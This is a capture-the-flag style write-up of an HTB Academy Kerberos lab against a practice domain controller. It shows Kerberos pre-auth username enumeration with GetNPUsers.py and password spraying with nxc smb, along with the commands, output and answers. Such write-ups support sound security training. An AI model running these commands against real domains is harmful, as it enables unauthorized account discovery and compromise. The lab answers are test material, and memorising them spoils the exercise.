# Account Enumeration & Password Spraying with Kerberos

**Module:** HTB Academy — Kerberos Attacks
**Target:** 10.129.70.148 (DC01), domain `inlanefreight.local`
**Given:** `q1_list.zip` → `usernamelist.txt` (candidate username permutations for "David Beckham", "Kelly Brook", "Tim Curry", "Rachel Weisz", plus `adam.jones`), `q2_list.zip` → `domainuserlist.txt` (confirmed domain usernames)
**Goal (q1):** which candidate username is a valid domain user?
**Goal (q2):** which user in the domain user list has password `HTBRocks!`?

**Result:** q1 = `adam.jones`, q2 = `matilda.kens`.

---

## 1. Attack chain

### q1 — Kerberos pre-auth username enumeration

Kerberos AS-REQ lets you enumerate valid usernames without any credentials: the KDC replies `KDC_ERR_C_PRINCIPAL_UNKNOWN` for a non-existent account, but gives a *different* response (pre-auth required, or an AS-REP if pre-auth is disabled) for a real one. `impacket`'s `GetNPUsers.py` run with `-no-pass` against a username list does exactly this check per-user.

```bash
GetNPUsers.py inlanefreight.local/ -usersfile usernamelist.txt -no-pass -dc-ip 10.129.70.148
```
Every name in the (209-entry) permutation list returned `KDC_ERR_C_PRINCIPAL_UNKNOWN` except one line:
```
[-] User adam.jones doesn't have UF_DONT_REQUIRE_PREAUTH set
```
That specific message (not the "unknown" error) means the KDC recognized `adam.jones` as a real account requiring normal pre-auth — i.e. it's valid, just not AS-REP-roastable.

**q1 answer: `adam.jones`**

### q2 — Password spraying with Kerberos-safe single-attempt-per-user

Sprayed the single password `HTBRocks!` across every name in the already-confirmed `domainuserlist.txt` (one attempt per account — safe against lockout policies, same principle the module teaches via Kerberos pre-auth spraying):
```bash
nxc smb 10.129.70.148 -u domainuserlist.txt -p 'HTBRocks!' -d inlanefreight.local --continue-on-success
```
Every account failed with `STATUS_LOGON_FAILURE` except the last one:
```
[+] inlanefreight.local\matilda.kens:HTBRocks!
```

**q2 answer: `matilda.kens`**

---

## 2. Notes

No blockers this task — both lists were plain-text, unencrypted inside the given zips (found alongside the other writeups in the working directory, per the task's "list在目錄下" pointer), and both the Kerberos pre-auth enumeration and the SMB spray against a single DC returned a clean, unambiguous single hit each.

---

## 3. Flags / Answers

- **q1:** `adam.jones`
- **q2:** `matilda.kens`
